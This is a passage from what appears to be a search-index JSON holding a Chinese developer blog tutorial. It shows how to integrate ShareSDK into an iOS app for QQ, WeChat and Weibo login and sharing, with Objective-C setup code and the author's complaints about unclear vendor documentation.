\u4e8b\u4ef6\u5904\u7406\u4ee3\u7801\uff0c\u5982\u4e0b\uff1a - (void)thridPartyShareWithShareType:(ShareType)shareType { //\u53ea\u9700\u8981\u5728\u54cd\u5e94\u5206\u4eab\u6309\u94ae\u7684\u65b9\u6cd5\u4e2d\u6dfb\u52a0\u4ee5\u4e0b\u4ee3\u7801\u5373\u53ef NSString *img = [[NSBundle mainBundle] pathForResource:@\"mm\" ofType:@\"png\"]; //\u6784\u9020\u5206\u4eab\u5185\u5bb9 id<ISSContent> publishContent = [ShareSDK content:@\"ShareSDK\u65e0\u6bd4\u5f3a\u5927\u54e6\" defaultContent:@\"\" image:[ShareSDK imageWithPath:img] title:@\"\u6f14\u793aDemo\u4e2d\u7684\u6807\u9898\" url:@\"http://www.mob.com\" description:@\"\u6d4b\u8bd5DEMO\u6b63\u5728\u5236\u4f5c\u4e2d\uff0c\u6b22\u8fce\u5927\u5bb6\u89c2\u770b\" mediaType:SSPublishContentMediaTypeNews]; [ShareSDK shareContent:publishContent type:shareType authOptions:nil shareOptions:nil statusBarTips:YES result:^(ShareType type, SSResponseState state, id<ISSPlatformShareInfo> statusInfo, id<ICMErrorInfo> error, BOOL end) { if (state == SSPublishContentStateSuccess) { NSLog(NSLocalizedString(@\"TEXT_SHARE_SUC\", @\"\u53d1\u8868\u6210\u529f\")); } else if (state == SSPublishContentStateFail) { NSLog(NSLocalizedString(@\"TEXT_SHARE_FAI\", @\"\u53d1\u5e03\u5931\u8d25!error code == %d, error code == %@\"), [error errorCode], [error errorDescription]); } }]; } \u65b9\u6cd5\u4e2d\u7684 shareType \u53c2\u6570\u4f20\u4ec0\u4e48\u503c\u5c31\u5206\u4eab\u5230\u4ec0\u4e48\u5e73\u53f0\uff1a ShareTypeSinaWeibo //\u65b0\u6d6a\u5fae\u535a ShareTypeQQSpace //QQ\u7a7a\u95f4 \uff08\u6ce8\u610f\uff1a\u586b\u5199\u8fd9\u4e2a\u7c7b\u578b\u5c31\u53ef\u4ee5\u5206\u4eab\u5230\u597d\u53cb\u548cQQ\u7a7a\u95f4\uff0c\u4e5f\u53ef\u4ee5\u7528\u6765\u505a\u767b\u5f55\uff09 ShareTypeWeixiSession //\u5fae\u4fe1\u597d\u53cb \uff08\u8fd9\u4e2a\u7c7b\u578b\u4e5f\u53ef\u4ee5\u7528\u6765\u505a\u5fae\u4fe1\u767b\u5f55\uff09 ShareTypeWeixiTimeline //\u5fae\u4fe1\u670b\u53cb\u5708 \u5230\u8fd9\u91cc\u5206\u4eab\u5c31\u7b97\u662f\u505a\u597d\u4e86\u3002 10.\u5199\u767b\u5f55\u4ee3\u7801\u3002\uff08 \u8fd9\u91cc\u5728ShareSDK\u7684\u6587\u6863\u91cc\uff0c\u53c8\u6709\u4e00\u4e2a\u5751 \uff09 \uff081\uff09\u5728ShareSDK\u505a\u7b2c\u4e09\u65b9\u767b\u5f55\u7684\u6587\u6863\u91cc\uff0c\u8fd9\u91cc\u8981\u6c42\u53bb\u4e00\u4e2a Parse \u7684\u7f51\u7ad9\u6ce8\u518c\u4e0b\u8f7d\u4e00\u5927\u5806\u4e1c\u897f\u3002\u5e76\u6dfb\u52a0\u4e00\u5806\u4f9d\u8d56\u5e93\uff0c\u53ef\u8fd9\u4e9b\u5e76\u6ca1\u6709\u4ec0\u4e48\u5375\u7528\u3002\u7406\u7531\u5982\u4e0b\uff1a \u5b83\u8ba9\u5728\u5e94\u7528\u4e86\u96c6\u6210Parse\uff0c\u5c31\u662f\u505a\u4e00\u4e2a\u5bf9\u7b2c\u4e09\u65b9\u5e73\u53f0\u8fd4\u56de\u7684\u4fe1\u606f\uff08id\u3001nickname\u3001profileImage\uff09\u8fdb\u884c\u5b58\u50a8\uff0c\u53ef\u8fd9\u4e9b\uff0c\u6211\u4eec\u90fd\u662f\u5b58\u81ea\u5df1\u516c\u53f8\u670d\u52a1\u5668\u7684\uff0c\u505a\u8fd9\u4e9b\u90fd\u662f\u626f\u6de1\u7684\uff0c\u4f46\u6587\u6863\u91cc\u5e76\u6ca1\u6709\u8bf4\u660e\u3002\u6211\u9760\uff0c\u8ba9\u6211\u90c1\u95f7\u534a\u5929\u3002 (2)\u5728\u754c\u9762\u6dfb\u52a0\u6309\u94ae\uff0c\u5e76\u7ed1\u5b9a\u54cd\u5e94\u4e8b\u4ef6\u3002 (3)\u5199\u54cd\u5e94\u4ee3\u7801\uff08 \u4ee5QQ\u767b\u5f55\u4e3a\u4f8b\uff0c\u4e09\u4e2a\u5e73\u53f0\u7684\u4ee3\u7801\u662f\u4e00\u6837\u7684\uff0c\u4e0d\u540c\u70b9\u5728Type\u8fd9\u4e2a\u53c2\u6570\u4e0a \uff09\u3002 - (IBAction)QQLogin:(UIButton *)sender { [ShareSDK getUserInfoWithType:ShareTypeQQSpace authOptions:nil result:^(BOOL result, id<ISSPlatformUser> userInfo, id<ICMErrorInfo> error) { if (result) { NSLog(@\"%hhd\", result); NSLog(@\"%@\", [userInfo uid]); NSLog(@\"%@\", [userInfo nickname]); NSLog(@\"%@\", [userInfo profileImage]); //\u5728\u8fd9\u91cc\u628a\u62ff\u5230\u7684userInfo\u91cc\u9762\u7684\u503c\u505a\u5904\u7406\uff0c\u5b58\u670d\u52a1\u5668\u6216\u8005\u4ec0\u4e48\u7684 UIAlertView *alertView = [[UIAlertView alloc] initWithTitle:@\"Hello\" message:@\"\u6b22\u8fce\u6ce8\u518c\" delegate:nil cancelButtonTitle:@\"\u77e5\u9053\u4e86\" otherButtonTitles: nil]; [alertView show]; } else { UIAlertView *alertView = [[UIAlertView alloc] initWithTitle:@\"Hello\" message:@\"\u6b22\u8fce\u56de\u6765\" delegate:nil cancelButtonTitle:@\"\u77e5\u9053\u4e86\" otherButtonTitles:nil]; [alertView show]; } }]; } \u5230\u8fd9\u91cc\u7b2c\u4e09\u65b9\u767b\u5f55\u5c31\u7b97\u662f\u505a\u597d\u4e86\u3002 \u6700\u540e\uff0c\u9000\u51fa\u767b\u5f55\u6388\u6743\u4f7f\u7528\u4e00\u4e0b\u4ee3\u7801\u3002 [ShareSDK cancelAuthWithType:ShareTypeQQSpace]; //\u8fd9\u91cc\u4ee5QQ\u4e3a\u4f8b\u4e86 \u603b\u7ed3\uff0c\u6574\u4e2a\u8fc7\u7a0b\u6765\u770b\u662f\u6ca1\u6709\u4ec0\u4e48\u6280\u672f\u542b\u91cf\u7684\uff0c\u4f46\u8ba9\u4eba\u611f\u5230\u56f0\u96be\u7684\u539f\u56e0\u5c31\u662f\u8fd9\u4e9b\u5e73\u53f0\u63d0\u4f9b\u7684\u6587\u6863\u95ee\u9898\uff0c\u4e0d\u6e05\u6670\uff0c\u4e0d\u8bf4\u660e\u662f\u5e72\u4ec0\u4e48\u7684\uff0c\u6d6a\u8d39\u5f88\u591a\u65f6\u95f4\u53bb\u7406\u89e3\u8fd9\u4e9b\u6587\u6863\u3002\u6211\u5f3a\u538b\u6012\u706b\u7684\u5728\u5fc3\u4e2d\u558a\u4e00\u53e5\uff1a\u64cd\u3002\u7136\u540e\u63a5\u7740\u57cb\u5934\u5199\u4ee3\u7801\u4e86\u3002 \u4e0b\u7bc7\u89c1\uff5e \u539f\u6587\u94fe\u63a5\uff1a https://www.jianshu.com/p/e374732f54f0","title":"\u4f7f\u7528ShareSDK\u5b8c\u6210\u7b2c\u4e09\u65b9\uff08QQ\u3001\u5fae\u4fe1\u3001\u5fae\u535a\uff09\u767b\u5f55\u548c\u5206\u4eab"},{"location":"Android/%E4%BD%BF%E7%94%A8ShareSDK%E5%AE%8C%E6%88%90%E7%AC%AC%E4%B8%89%E6%96%B9%EF%BC%88QQ%E3%80%81%E5%BE%AE%E4%BF%A1%E3%80%81%E5%BE%AE%E5%8D%9A%EF%BC%89%E7%99%BB%E5%BD%95%E5%92%8C%E5%88%86%E4%BA%AB/#1sharesdksharesdk","text":"","title":"1.\u53bbShareSDK\u5b98\u7f51\u6ce8\u518c\u4e00\u4e2a\u8d26\u53f7\u65b9\u4fbf\u4ee5\u540e\u5bf9ShareSDK\u7684\u914d\u7f6e\u3002"},{"location":"Android/%E4%BD%BF%E7%94%A8ShareSDK%E5%AE%8C%E6%88%90%E7%AC%AC%E4%B8%89%E6%96%B9%EF%BC%88QQ%E3%80%81%E5%BE%AE%E4%BF%A1%E3%80%81%E5%BE%AE%E5%8D%9A%EF%BC%89%E7%99%BB%E5%BD%95%E5%92%8C%E5%88%86%E4%BA%AB/#2","text":"","title":"2.\u6309\u7167\u96c6\u6210\u6587\u6863\u7684\u6b65\u9aa4\u5f00\u59cb\u505a\uff0c\u4e0d\u5f97\u4e0d\u8bf4\u8fd9\u4e2a\u96c6\u6210\u6587\u6863\u91cc\u9762\u6709\u5751\uff0c\u6709\u5751\u7684\u5730\u65b9\u6211\u4f1a\u6307\u51fa\u3002"},{"location":"Android/%E4%BD%BF%E7%94%A8ShareSDK%E5%AE%8C%E6%88%90%E7%AC%AC%E4%B8%89%E6%96%B9%EF%BC%88QQ%E3%80%81%E5%BE%AE%E4%BF%A1%E3%80%81%E5%BE%AE%E5%8D%9A%EF%BC%89%E7%99%BB%E5%BD%95%E5%92%8C%E5%88%86%E4%BA%AB/#3test","text":"\u8fd9\u91cc\u7684App Key\u548cApp Secret\uff08\u4e0d\u663e\u793a\u7684\u8bdd\uff0c\u70b9\u51fb\u663e\u793a\uff09\u5f88\u91cd\u8981\uff0c\u53ef\u4ee5\u7528\u6765\u521d\u59cb\u5316ShareSDK\uff0c","title":"3.\u6dfb\u52a0\u4e00\u4e2a\u5e94\u7528\u3002\u6709\u5f88\u591a\u79cd\u65b9\u5f0f\u53ef\u4ee5\u6dfb\u52a0\u4e00\u4e2a\u5e94\u7528\uff0c\u591a\u70b9\u70b9\u3002\u8fd9\u91cc\u6211\u521b\u5efa\u4e86\u4e00\u4e2atest\u5e94\u7528\u3002"},{"location":"Android/%E4%BD%BF%E7%94%A8ShareSDK%E5%AE%8C%E6%88%90%E7%AC%AC%E4%B8%89%E6%96%B9%EF%BC%88QQ%E3%80%81%E5%BE%AE%E4%BF%A1%E3%80%81%E5%BE%AE%E5%8D%9A%EF%BC%89%E7%99%BB%E5%BD%95%E5%92%8C%E5%88%86%E4%BA%AB/#4sdk","text":"\u4e0b\u8f7dSDK \u8fd9\u91cc\u662f\u7b2c\u4e00\u4e2a\u5751 \uff0c\u867d\u7136\u4f60\u53ef\u4ee5\u81ea\u5b9a\u4e49\u4e0b\u8f7dSDK\uff0c \u5982\u679c\u4f60\u505aQQ\u5206\u4eab\u548c\u767b\u5f55\uff0c\u4e00\u5b9a\u4e0d\u8981\u5fd8\u8bb0\u4e0b\u8f7dQQ\u7a7a\u95f4\u7684SDK \u3002\u56e0\u4e3aQQ\u672c\u8eab\u4e0d\u652f\u6301\u7b2c\u4e09\u65b9\u767b\u5f55\uff0c\u4f46\u652f\u6301\u7b2c\u4e09\u65b9\u5206\u4eab\u5305\u62ecQQ\u7a7a\u95f4\u5206\u4eab\uff0cQQ\u7a7a\u95f4\u652f\u6301\u7b2c\u4e09\u65b9\u767b\u5f55\uff0c\u6240\u4ee5\u5982\u679c\u4f60\u505aQQ\u5206\u4eab\u548c\u767b\u5f55\uff0c\u4e00\u5b9a\u8981\u8bb0\u5f97\u4e0b\u8f7dQQ\u7a7a\u95f4\u7684SDK\u3002 \u5982\u679c\u53ea\u505a\u5206\u4eab\uff0c\u90a3\u53ea\u4e0b\u8f7dQQ\u7684\u5c31\u884c \u3002\u8fd9\u91cc\u6211\u88ab\u5751\u8fc7\uff0cShareSDK\u63d0\u4f9b\u7684\u6587\u6863\u91cc\u9762\u6ca1\u6709\u8bf4\u660e\u3002","title":"4.\u4e0b\u8f7dSDK\u3002"},{"location":"Android/%E4%BD%BF%E7%94%A8ShareSDK%E5%AE%8C%E6%88%90%E7%AC%AC%E4%B8%89%E6%96%B9%EF%BC%88QQ%E3%80%81%E5%BE%AE%E4%BF%A1%E3%80%81%E5%BE%AE%E5%8D%9A%EF%BC%89%E7%99%BB%E5%BD%95%E5%92%8C%E5%88%86%E4%BA%AB/#5sharesdk","text":"\u5230\u73b0\u5728\u4e3a\u6b62\u8fd0\u884c\u9879\u76ee\u662f\u4f1a\u62a5\u9519\u7684\uff0c\u539f\u56e0\u662f\u6ca1\u6709\u6dfb\u52a0\u76f8\u5173\u7684\u4f9d\u8d56\u5e93\u3002","title":"5.\u628a\u4e0b\u8f7d\u7684ShareSDK\u6dfb\u52a0\u5230\u9879\u76ee\u4e2d\u3002"},{"location":"Android/%E4%BD%BF%E7%94%A8ShareSDK%E5%AE%8C%E6%88%90%E7%AC%AC%E4%B8%89%E6%96%B9%EF%BC%88QQ%E3%80%81%E5%BE%AE%E4%BF%A1%E3%80%81%E5%BE%AE%E5%8D%9A%EF%BC%89%E7%99%BB%E5%BD%95%E5%92%8C%E5%88%86%E4%BA%AB/#6","text":"\u4ee5\u4e0b\u6458\u81eaShareSDK\u63d0\u4f9b\u7684\u6587\u6863\u3002 \u5fc5\u987b\u6dfb\u52a0\u7684\u4f9d\u8d56\u5e93\u5982\u4e0b\uff1a SystemConfiguration.framework QuartzCore.framework CoreTelephony.framework libicucore.dylib libz.1.2.5.dylib Security.framework \u4ee5\u4e0b\u4f9d\u8d56\u5e93\u6839\u636e\u793e\u4ea4\u5e73\u53f0\u6dfb\u52a0 \u65b0\u6d6a\u5fae\u535aSDK\u4f9d\u8d56\u5e93 \uff08\u4ecev2.10.5\u5f00\u59cb\uff09 ImageIO.framework QQ\u597d\u53cb\u548cQQ\u7a7a\u95f4SSO\u5fc5\u8981\uff08\u65b0\u6ce8\u518c\u817e\u8baf\u5f00\u653e\u5e73\u53f0\u5e10\u53f7\u53ea\u652f\u6301SSO\u6388\u6743\uff0c\u53ea\u662f\u8001\u5f00\u53d1\u8005\u624d\u53ef\u4ee5\u4f7f\u7528\u7f51\u9875\u6388\u6743\uff09 libstdc++.dylib libsqlite3.dylib \u5230\u8fd9\u91cc\u8fd0\u884c\u9879\u76ee\u662f\u4e0d\u4f1a\u62a5\u9519\u7684\uff0c\u5982\u679c\u62a5\u9519\uff0c\u68c0\u67e5\u6dfb\u52a0\u7684\u4f9d\u8d56\u5e93\u662f\u7f3a\u4e86\u3001\u6f0f\u4e86\u3001\u8fd8\u662f\u9519\u4e86\u3002 \u5728 AppDelegate.m \u4e2d\u6dfb\u52a0\u4ee5\u4e0b\u5934\u6587\u4ef6\uff0c\u518d\u8fd0\u884c\u9879\u76ee\u770b\u770b\uff0c\u8fd9\u662f\u4e0d\u4f1a\u62a5\u9519\u7684\uff0c\u5982\u679c\u62a5\u9519\u770b\u63d0\u793a\u4fe1\u606f\uff0c\u591a\u641c\u7d22\uff0c\u76f8\u4fe1\u662f\u80fd\u591f\u89e3\u51b3\u7684\u3002 #import <ShareSDK/ShareSDK.h> #import <TencentOpenAPI/QQApiInterface.h> #import <TencentOpenAPI/TencentOAuth.h> #import \"WXApi.h\" #import \"WeiboSDK.h\"","title":"6.\u6dfb\u52a0\u76f8\u5173\u7684\u4f9d\u8d56\u5e93\u3002"},{"location":"Android/%E4%BD%BF%E7%94%A8ShareSDK%E5%AE%8C%E6%88%90%E7%AC%AC%E4%B8%89%E6%96%B9%EF%BC%88QQ%E3%80%81%E5%BE%AE%E4%BF%A1%E3%80%81%E5%BE%AE%E5%8D%9A%EF%BC%89%E7%99%BB%E5%BD%95%E5%92%8C%E5%88%86%E4%BA%AB/#7","text":"\u6dfb\u52a0\u65b0\u6d6a\u5fae\u535a\u5e94\u7528 \u6ce8\u518c\u7f51\u5740 http://open.weibo.com \u6dfb\u52a0QQ\u5e94\u7528 \u6ce8\u518c\u7f51\u5740 http://mobile.qq.com/api/ \u6dfb\u52a0\u5fae\u4fe1\u5e94\u7528 http://open.weixin.qq.com \u6ce8\u610f\uff1a\u8fd9\u4e09\u5bb6\u7684\u5f00\u653e\u5e73\u53f0\uff0c\u76ee\u524d\u4e3a\u6b62\uff0c\u9875\u9762\u505a\u7684\u90fd\u8ddf\u5c71\u5be8\u7f51\u7ad9\u4f3c\u7684\uff08\u5fae\u4fe1\u7684\u597d\u4e00\u70b9\uff09\uff0c\u5947\u5361\u65e0\u6bd4\u3002\u5f53\u7136\u8fd9\u4e0d\u662f\u5410\u69fd\u7684\u91cd\u70b9\uff0c\u91cd\u70b9\u662f\u6ce8\u518c\u6d41\u7a0b\u7e41\u7410\uff0c\u8fd8\u8981\u8ba4\u8bc1\u5f00\u53d1\u8005\u8eab\u4efd\uff0c\u9700\u8981\u7b49\u4e00\u4e2a\u5de5\u4f5c\u65e5\u3002\u5176\u4e2d\u5982\u679c\u505a\u5fae\u4fe1\u767b\u5f55\u7684\u8bdd\uff0c\u6bcf\u5e74\u8981\u4ea4300\u5143\u7684\u4ec0\u4e48\u8d39\u3002\u8fd9\u91cc\u6ca1\u6709\u4ec0\u4e48\u96be\u5ea6\u5c31\u662f\u4e2a\u4f53\u529b\u6d3b\uff0c\u5c31\u4e0d\u8be6\u8bf4\u4e86\uff0c\u6709\u4ec0\u4e48\u7591\u95ee\uff0c\u8bf7\u7559\u8a00\uff0c\u4f60\u7684\u7559\u8a00\u4e5f\u662f\u5bf9\u6211\u7684\u4fe1\u4efb\u548c\u652f\u6301\u3002 \u6ce8\u518c\u5b8c\uff0c\u7533\u8bf7\u5b8c\u5c31\u53ef\u4ee5\u62ff\u5230AppID\u3001AppSecret\u3001AppKey\u7b49\u4e1c\u897f\u3002 \u6ce8\uff1aQQ\u7684AppKey\u5728ShareSDK\u4e2d\u53ebAppSecret\u3002 \u540d\u5b57\u4e0d\u7edf\u4e00\uff0c\u8fd9\u4e2a\u6bd4\u8f83\u626f\u6de1\u3002 \u62ff\u5230\u8fd9\u4e9bAppID\u3001AppSecret\u3001AppKey\u7b49\u4e1c\u897f\u540e\u5c31\u53ef\u4ee5\u5f00\u59cb\u5bf9ShareSDK\u8fdb\u884c\u521d\u59cb\u5316\u3002 \u5728 AppDelegate.m \u4e2d\u6dfb\u52a0\u4e0b\u9762\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u5e76\u8bb0\u5f97\u5728 - (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions \u65b9\u6cd5\u4e2d\u8c03\u7528\u3002 - (void)initShareSDK { [ShareSDK registerApp:@\"884a1b86xxxx\"]; //\u5bf9\u65b0\u6d6a\u5fae\u535aSDK\u8fdb\u884c\u521d\u59cb\u5316 [ShareSDK connectSinaWeiboWithAppKey:@\"406116xxxx\" appSecret:@\"b6a542582057e39a6fca582b14dxxxxxx\" redirectUri:@\"http://www.xxxx.com\"]; //\u6ce8\u8fd9\u91cc\u7684redirectUri\u8981\u4e0e\u4f60\u5728\u65b0\u6d6a\u5fae\u535a\u5f00\u653e\u5e73\u53f0\u4e0a\u586b\u5199\u7684\u90a3\u4e2a\u6388\u6743\u56de\u8c03\u9875\u7684URL\u4fdd\u6301\u4e00\u81f4\uff0c\u5426\u5219\u5728\u4f7f\u7528\u5fae\u535a\u767b\u5f55\u7684\u65f6\u5019\u4f1a\u62a5\u4e00\u4e2aredirectUri\u627e\u4e0d\u5230\u7684\u9519\u8bef\uff0c\u8fd9\u91cc\u662f\u4e00\u4e2a\u5751\u3002 //\u7a81\u7136\u53d1\u73b0\u8fd9\u91ccredirectUri\u662f\u4ec0\u4e48\u9b3c\uff1f\u96be\u9053ShareSDK\u7684\u5236\u4f5c\u8005\u6572\u9519\u4e86\uff1f\u4e0d\u5e94\u8be5\u662fURL\u5417\uff1f //QQ\u5206\u4eabSDK\u521d\u59cb\u5316 [ShareSDK connectQQWithQZoneAppKey:@\"110467xxxx\" qqApiInterfaceCls:[QQApiInterface class] tencentOAuthCls:[TencentOAuth class]]; //QQ\u767b\u5f55SDK\u521d\u59cb\u5316 [ShareSDK connectQZoneWithAppKey:@\"1104677455\" appSecret:@\"KnjAB2I0G8Vxxxxx\" qqApiInterfaceCls:[QQApiInterface class] tencentOAuthCls:[TencentOAuth class]]; // \u6ce8\uff1aQQ\u767b\u5f55\u7684appSecret\u53c2\u6570\uff0c\u662f\u4f60\u5728QQ\u5f00\u653e\u5e73\u53f0\u662f\u62ff\u5230\u7684AppKey //\u5bf9\u5fae\u4fe1SDK\u8fdb\u884c\u521d\u59cb\u5316 [ShareSDK connectWeChatWithAppId:@\"wx02e84c8fa45xxxx\" appSecret:@\"ef9006286ce2637caeb648cb58dxxxx\" wechatCls:[WXApi class]]; }","title":"7.\u5230\u76f8\u5e94\u5f00\u53d1\u8005\u5e73\u53f0\u6ce8\u518c\u5f00\u53d1\u8005\u8d26\u53f7\uff0c\u5e76\u6dfb\u52a0\u4f60\u8981\u8fdb\u884c\u5206\u4eab\u548c\u4f7f\u7528\u7b2c\u4e09\u65b9\u767b\u5f55\u5e94\u7528\u7684\u4fe1\u606f\u3002"},{"location":"Android/%E4%BD%BF%E7%94%A8ShareSDK%E5%AE%8C%E6%88%90%E7%AC%AC%E4%B8%89%E6%96%B9%EF%BC%88QQ%E3%80%81%E5%BE%AE%E4%BF%A1%E3%80%81%E5%BE%AE%E5%8D%9A%EF%BC%89%E7%99%BB%E5%BD%95%E5%92%8C%E5%88%86%E4%BA%AB/#8url-schemes","text":"\u70b9\u51fb\uff1a\u9879\u76ee\u540d > TARGETS > info > URL Types \u70b9\u51fb\u6dfb\u52a0URL Types\u3002 \u5728URL Schemes\u540e\u9762\u7684\u6846\u91cc\u6dfb\u4e0a\u5bf9\u5e94\u4fe1\u606f\u3002 \u65b0\u6d6a\u5fae\u535a\u7684URL Schemes\u662f\uff1awb \u52a0\u4e0a\u5728\u5fae\u535a\u5f00\u653e\u5e73\u53f0\u7533\u8bf7\u7684AppKey\u3002 \u5fae\u4fe1\u7684URL Schemes\u662f\uff1a\u5fae\u4fe1\u5f00\u653e\u5e73\u53f0\u7533\u8bf7\u7684AppID\u3002 QQ\u7a7a\u95f4\u7684URL Schemes\u662f\uff1aQQ\u5f00\u653e\u5e73\u53f0\u7533\u8bf7\u7684 tencent \u52a0\u4e0a AppID\u3002\uff08\u5982\u679c\u53ea\u505a\u5206\u4eab\u7684\u8bdd\uff0c\u53ef\u4ee5\u4e0d\u6dfb\u52a0\uff0c\u505a\u767b\u5f55\u7684\u8bdd\u5fc5\u987b\u6dfb\u52a0\uff09 QQ\u7684URL Schemes\u662f\uff1aQQ \u52a0\u4e0a AppID\u768416\u8fdb\u5236\uff08\u5982\u679cAppID\u8f6c\u6362\u768416\u8fdb\u5236\u6570\u4e0d\u591f8\u4f4d\u5219\u5728\u524d\u9762\u88650\uff0c\u5982\u8f6c\u6362\u7684\u662f\uff1a5FB8B52\uff0c\u5219\u6700\u7ec8\u586b\u5165\u4e3a\uff1aQQ05FB8B52 \u6ce8\u610f\uff1a\u8f6c\u6362\u540e\u7684\u5b57\u6bcd\u8981\u5927\u5199\uff09 \u8f6c\u636216\u8fdb\u5236\u7684\u65b9\u6cd5\uff1a echo 'ibase=10;obase=16;801312852'|bc \uff0c\u5176\u4e2d801312852\u4e3aQQ\u7684AppID\uff0c\u89c1\u4e0b\u56fe\uff1a \u6dfb\u52a0\u5b8cURL Schemes\u540e\uff0c\u5728 AppDelegate.m \u6587\u4ef6\u4e2d\u6dfb\u52a0\u4ee5\u4e0b\u5bf9URL\u5904\u7406\u7684\u4ee3\u7801\uff1a - (BOOL)application:(UIApplication *)application handleOpenURL:(NSURL *)url { return [ShareSDK handleOpenURL:url wxDelegate:self]; } - (BOOL)application:(UIApplication *)application openURL:(NSURL *)url sourceApplication:(NSString *)sourceApplication annotation:(id)annotation { return [ShareSDK handleOpenURL:url sourceApplication:sourceApplication annotation:annotation wxDelegate:self]; } \u5230\u6b64\u7b2c\u4e09\u65b9\u7684\u51c6\u5907\u5de5\u4f5c\u5c31\u7b97\u662f\u505a\u5b8c\u4e86\u3002","title":"8.\u6dfb\u52a0URL Schemes\u3002"},{"location":"Android/%E4%BD%BF%E7%94%A8ShareSDK%E5%AE%8C%E6%88%90%E7%AC%AC%E4%B8%89%E6%96%B9%EF%BC%88QQ%E3%80%81%E5%BE%AE%E4%BF%A1%E3%80%81%E5%BE%AE%E5%8D%9A%EF%BC%89%E7%99%BB%E5%BD%95%E5%92%8C%E5%88%86%E4%BA%AB/#9","text":"\uff081\uff09\u5728\u754c\u9762\u4e0a\u6dfb\u52a0\u6309\u94ae\uff0c\u5e76\u7ed1\u5b9a\u54cd\u5e94\u4e8b\u4ef6\u3002 \uff082\uff09\u5199\u4e8b\u4ef6\u5904\u7406\u4ee3\u7801\u3002 \u4e8b\u4ef6\u5904\u7406\u4ee3\u7801\uff0c\u5982\u4e0b\uff1a - (void)thridPartyShareWithShareType:(ShareType)shareType { //\u53ea\u9700\u8981\u5728\u54cd\u5e94\u5206\u4eab\u6309\u94ae\u7684\u65b9\u6cd5\u4e2d\u6dfb\u52a0\u4ee5\u4e0b\u4ee3\u7801\u5373\u53ef NSString *img = [[NSBundle mainBundle] pathForResource:@\"mm\" ofType:@\"png\"]; //\u6784\u9020\u5206\u4eab\u5185\u5bb9 id<ISSContent> publishContent = [ShareSDK content:@\"ShareSDK\u65e0\u6bd4\u5f3a\u5927\u54e6\" defaultContent:@\"\" image:[ShareSDK imageWithPath:img] title:@\"\u6f14\u793aDemo\u4e2d\u7684\u6807\u9898\" url:@\"http://www.mob.com\" description:@\"\u6d4b\u8bd5DEMO\u6b63\u5728\u5236\u4f5c\u4e2d\uff0c\u6b22\u8fce\u5927\u5bb6\u89c2\u770b\" mediaType:SSPublishContentMediaTypeNews]; [ShareSDK shareContent:publishContent type:shareType authOptions:nil shareOptions:nil statusBarTips:YES result:^(ShareType type, SSResponseState state, id<ISSPlatformShareInfo> statusInfo, id<ICMErrorInfo> error, BOOL end) { if (state == SSPublishContentStateSuccess) { NSLog(NSLocalizedString(@\"TEXT_SHARE_SUC\", @\"\u53d1\u8868\u6210\u529f\")); } else if (state == SSPublishContentStateFail) { NSLog(NSLocalizedString(@\"TEXT_SHARE_FAI\", @\"\u53d1\u5e03\u5931\u8d25!error code == %d, error code == %@\"), [error errorCode], [error errorDescription]); } }]; } \u65b9\u6cd5\u4e2d\u7684 shareType \u53c2\u6570\u4f20\u4ec0\u4e48\u503c\u5c31\u5206\u4eab\u5230\u4ec0\u4e48\u5e73\u53f0\uff1a ShareTypeSinaWeibo //\u65b0\u6d6a\u5fae\u535a ShareTypeQQSpace //QQ\u7a7a\u95f4 \uff08\u6ce8\u610f\uff1a\u586b\u5199\u8fd9\u4e2a\u7c7b\u578b\u5c31\u53ef\u4ee5\u5206\u4eab\u5230\u597d\u53cb\u548cQQ\u7a7a\u95f4\uff0c\u4e5f\u53ef\u4ee5\u7528\u6765\u505a\u767b\u5f55\uff09 ShareTypeWeixiSession //\u5fae\u4fe1\u597d\u53cb \uff08\u8fd9\u4e2a\u7c7b\u578b\u4e5f\u53ef\u4ee5\u7528\u6765\u505a\u5fae\u4fe1\u767b\u5f55\uff09 ShareTypeWeixiTimeline //\u5fae\u4fe1\u670b\u53cb\u5708 \u5230\u8fd9\u91cc\u5206\u4eab\u5c31\u7b97\u662f\u505a\u597d\u4e86\u3002","title":"9.\u5199\u5206\u4eab\u7684\u4ee3\u7801\u3002"},{"location":"Android/%E4%BD%BF%E7%94%A8ShareSDK%E5%AE%8C%E6%88%90%E7%AC%AC%E4%B8%89%E6%96%B9%EF%BC%88QQ%E3%80%81%E5%BE%AE%E4%BF%A1%E3%80%81%E5%BE%AE%E5%8D%9A%EF%BC%89%E7%99%BB%E5%BD%95%E5%92%8C%E5%88%86%E4%BA%AB/#10sharesdk","text":"\uff081\uff09\u5728ShareSDK\u505a\u7b2c\u4e09\u65b9\u767b\u5f55\u7684\u6587\u6863\u91cc\uff0c\u8fd9\u91cc\u8981\u6c42\u53bb\u4e00\u4e2a Parse \u7684\u7f51\u7ad9\u6ce8\u518c\u4e0b\u8f7d\u4e00\u5927\u5806\u4e1c\u897f\u3002\u5e76\u6dfb\u52a0\u4e00\u5806\u4f9d\u8d56\u5e93\uff0c\u53ef\u8fd9\u4e9b\u5e76\u6ca1\u6709\u4ec0\u4e48\u5375\u7528\u3002\u7406\u7531\u5982\u4e0b\uff1a \u5b83\u8ba9\u5728\u5e94\u7528\u4e86\u96c6\u6210Parse\uff0c\u5c31\u662f\u505a\u4e00\u4e2a\u5bf9\u7b2c\u4e09\u65b9\u5e73\u53f0\u8fd4\u56de\u7684\u4fe1\u606f\uff08id\u3001nickname\u3001profileImage\uff09\u8fdb\u884c\u5b58\u50a8\uff0c\u53ef\u8fd9\u4e9b\uff0c\u6211\u4eec\u90fd\u662f\u5b58\u81ea\u5df1\u516c\u53f8\u670d\u52a1\u5668\u7684\uff0c\u505a\u8fd9\u4e9b\u90fd\u662f\u626f\u6de1\u7684\uff0c\u4f46\u6587\u6863\u91cc\u5e76\u6ca1\u6709\u8bf4\u660e\u3002\u6211\u9760\uff0c\u8ba9\u6211\u90c1\u95f7\u534a\u5929\u3002 (2)\u5728\u754c\u9762\u6dfb\u52a0\u6309\u94ae\uff0c\u5e76\u7ed1\u5b9a\u54cd\u5e94\u4e8b\u4ef6\u3002 (3)\u5199\u54cd\u5e94\u4ee3\u7801\uff08 \u4ee5QQ\u767b\u5f55\u4e3a\u4f8b\uff0c\u4e09\u4e2a\u5e73\u53f0\u7684\u4ee3\u7801\u662f\u4e00\u6837\u7684\uff0c\u4e0d\u540c\u70b9\u5728Type\u8fd9\u4e2a\u53c2\u6570\u4e0a \uff09\u3002 - (IBAction)QQLogin:(UIButton *)sender { [ShareSDK getUserInfoWithType:ShareTypeQQSpace authOptions:nil result:^(BOOL result, id<ISSPlatformUser> userInfo, id<ICMErrorInfo> 